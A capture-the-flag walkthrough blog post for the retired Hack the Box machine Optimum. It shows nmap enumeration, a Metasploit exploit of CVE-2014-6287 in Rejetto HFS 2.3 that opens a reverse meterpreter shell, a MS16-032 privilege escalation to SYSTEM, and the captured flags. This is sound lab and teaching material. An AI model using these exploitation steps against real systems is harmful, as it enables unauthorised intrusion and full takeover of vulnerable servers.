---
title: Optimum, Hack the Box CTF Walkthrough
lead: Exploiting CVE-2014-6287, Rejetto HTTP File Server (HFS) 2.3.x Remote Command Execution
tag: CTF
image: /assets/img/posts/2021-03-04-Optimum-hack-the-box-walkthrough/Optimum.png
layout: post
description: ""
date:   2021-03-04 20:01:21 -0400
last-updated: 2021-03-04 20:01:21 -0400
tag: ctf
author: Tyler Butler
desription: "Optimum is an easy level HTB challenge from the HTB archives. This challenge requires initial user access through a remote command execution vulnerability and local privilege escalation"
card: card-2
navheader: posts
---

Optimum is a easy level retired CTF from Hack the Box. To root this machine, I gained initial access by exploiting a remote command execution vulnerability (CVE-2014-6287) and escalated privileges to root through a local windows privilege escalation vulnerability (CVE-2016-0099).  

## Enumeration

To start, I used nmap to enumerate open services and running ports.  The resulting output revealed the target server was running the HttpFileServer, version 2.3.  

```bash
┌──(kali㉿kali)-[~/Documents/htb/OptimumRETIRED]
└─$ sudo nmap -sV -A -O --top-ports 200 10.10.10.8                                                                                           1 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 20:01 EST
Nmap scan report for 10.10.10.8
Host is up (0.026s latency).
Not shown: 199 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.39 ms 10.10.14.1
2   27.77 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
```  

## Vulnerability Identification  

Research into the HttpFileServer version 2.3 revealed its vulnerable to CVE-2014-6287, a remote command execution  vulnerability which has several public exploits available. One of these exploits is available in a metasploit module, so I launched metasploit and configured the necessary options.  

```bash
msf6 > search CVE-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```  

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Using URL: http://0.0.0.0:8081/IfzP0QI2SL
[*] Local IP: http://192.168.232.8:8081/IfzP0QI2SL
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /IfzP0QI2SL
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.13:4444 -> 10.10.10.8:49162) at 2021-03-04 20:09:00 -0500

[!] Tried to delete %TEMP%\OMHaX.vbs, unknown result



[*] Server stopped.

meterpreter > 
```   

## Locate User Flag  

Using the meterpreter shell, I located the user flag and read its contents.  

```bash
meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2021-03-11 05:11:20 -0500  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 06:58:52 -0500  hfs.exe
100444/r--r--r--  32      fil   2017-03-18 08:13:18 -0400  user.txt.txt

meterpreter > cat user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73
```  

## Post Exploitation Enumeration    

The CVE-2014-6287 exploit opened the meterpreter shell as the kostas user. To read the contents of the Admin flag, I would need to escalate to SYSTEM privilege. First, I attempted the `getsystem` meterpreter command, but this failed. I started to gather additional details about the target, starting with the meterpreter `sysinfo` command.  

```bash
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```  

Researching for local privilege escalation vulnerabilities specific for Windows 2012 R2 (6.3 Build 9600) revealed CVE-2016-0099. Fortunately, this too has a metasploit module available. I configured the module and launched the exploit.   

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.13:4441 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\KqxoHA.ps1...
[*] Compressing script contents...
[+] Compressed size: 3592
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2112

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2080
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

PykxFdTyo5bVOiBbBCJ1ZoZo9QIdtpa6
[+] Executed on target machine.
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.13:4441 -> 10.10.10.8:49166) at 2021-03-04 20:41:02 -0500
[+] Deleted C:\Users\kostas\AppData\Local\Temp\KqxoHA.ps1

meterpreter > shell
```  

## Locate Root Flag  

Using the meterpreter `shell` command, I dropped into the windows cmd shell and searched manually for the root flag.   

```bash
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\Administrator\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
18/03/2017  02:14 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  31.899.729.920 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
51ed1b36553c8461f4552c2e92b3eeed
C:\Users\Administrator\Desktop>
```